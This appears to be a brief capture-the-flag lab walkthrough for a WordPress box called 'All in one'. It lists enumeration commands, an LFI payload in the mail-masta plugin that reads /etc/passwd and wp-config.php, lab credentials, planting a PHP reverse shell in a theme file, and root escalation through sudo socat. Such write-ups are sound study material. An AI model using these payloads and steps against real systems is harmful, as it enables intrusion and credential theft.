# All in one
> EXPORT_IP :  10.10.216.98

## SCAN
 - nmap/inital

## Directory Enum
```
[Hidden]
: http://10.10.216.98/hackathons
: http://10.10.216.98/wordpress
```

## Wpscan Enum
 - wpscan --url http://{EXPORT_IP}
   - Result : wpscan.log 
 - Attack Point
   - mail-masta
   - exploit-db : https://www.exploit-db.com/exploits/40290
   - LFI : /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
   - wp-config.php
     - php://filter/convert.base64-encode/resource=../../../../../wp-config.php 


## Wp-admin Credential
```
elyana:H@ckme@123
```

## Reverse Shell
```
1.find php-revese-shell point
- Appearance
- theme Editor

2. location
> wordpress/wp-content/themes/twentytwenty/404.php

```

## USER ESCALATE
```
1. find elyana
> find / -user elyana -type f 2>/dev/null
> /etc/mysql/conf.d/private.txt
> elyana:E@syR18ght
```

## PRIVILGE ESCALATE
```
1. su elyana
> E@syR18ght

2. sudo -l -> socat

3. socat
- sudo socat stdin exec:/bin/sh
```